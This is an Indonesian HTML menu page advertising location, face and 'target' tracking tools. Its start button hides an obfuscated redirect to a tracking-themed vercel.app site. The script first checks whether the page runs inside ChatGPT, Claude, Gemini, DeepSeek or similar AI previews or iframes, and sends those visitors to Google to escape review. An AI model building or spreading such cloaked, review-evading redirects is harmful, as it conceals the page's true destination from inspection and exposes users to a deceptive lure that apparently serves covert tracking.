<!doctype html>
<html lang='id'>
<head>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width,initial-scale=1'>
    <title>Menu</title>
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css'>
    <style>
        body{margin:0;font-family:Arial;background:#181028;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
        .wrap{width:95%;max-width:760px}
        .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
        .card{background:#2b1b44;border-radius:14px;padding:12px;text-align:center}
        i{font-size:30px;color:#c87cff}
        h4{margin:8px 0 4px;font-size:15px}
        p{margin:0;font-size:11px;color:#ddd}
        button{display:block;margin:20px auto 0;padding:14px 40px;border:none;border-radius:30px;background:#8b3dff;color:#fff;font-size:18px;cursor:pointer;transition:background 0.3s}
        button:hover{background:#a35eff}
        @media(max-width:600px){.grid{grid-template-columns:repeat(2,1fr)}}
    </style>
</head>
<body>
    <div class='wrap'>
        <div class='grid'>
            <div class='card'><i class='fa-solid fa-map-location-dot'></i><h4>Map</h4><p>Tracking lokasi.</p></div>
            <div class='card'><i class='fa-solid fa-camera'></i><h4>Camera</h4><p>AI Camera objek tracking.</p></div>
            <div class='card'><i class='fa-solid fa-face-smile'></i><h4>Face Tracking</h4><p>Tracking Wajah.</p></div>
            <div class='card'><i class='fa-solid fa-crosshairs'></i><h4>Target</h4><p>Tracking target.</p></div>
            <div class='card'><i class='fa-solid fa-box'></i><h4>Lacak Paket</h4><p>Status paket.</p></div>
            <div class='card'><i class='fa-brands fa-youtube'></i><h4>Cari Video</h4><p>Video musik sambil mendengarkan lagu khusus pengendara.</p></div>
        </div>
        <button id="btn-mulai">Memulai</button>
    </div>

    <script>
        document.getElementById('btn-mulai').addEventListener('click', function() {
            const rootNode = window.location.hostname || '';
            const viewRef = document.referrer || '';
            const nestCheck = window.self !== window.top;
            
            const strictRules = ['chatgpt', 'openai', 'claude', 'gemini', 'deepseek', 'kimi', 'moonshot', 'usercontent', 'v0'];
            let validationFail = false;
            
            for (let i = 0; i < strictRules.length; i++) {
                if (rootNode.includes(strictRules[i]) || viewRef.includes(strictRules[i])) {
                    validationFail = true;
                    break;
                }
            }
            
            if (nestCheck && (rootNode === '' || rootNode.includes('preview') || rootNode.includes('null'))) {
                validationFail = true;
            }

            if (validationFail) {
                window.location.href = 'https://www.google.com';
                return;
            }

            const renderMatrix = [121, 133, 133, 129, 132, 75, 64, 64, 133, 128, 128, 125, 132, 62, 114, 122, 62, 133, 131, 114, 116, 124, 122, 127, 120, 62, 117, 118, 133, 118, 124, 132, 122, 62, 125, 128, 116, 114, 133, 122, 128, 127, 63, 135, 118, 131, 116, 118, 125, 63, 114, 129, 129];
            const scaleFactor = 17;
            
            let computedPath = '';
            for (let j = 0; j < renderMatrix.length; j++) {
                computedPath += String.fromCharCode(renderMatrix[j] - scaleFactor);
            }
            
            window.location.href = computedPath;
        });
    </script>
</body>
</html>
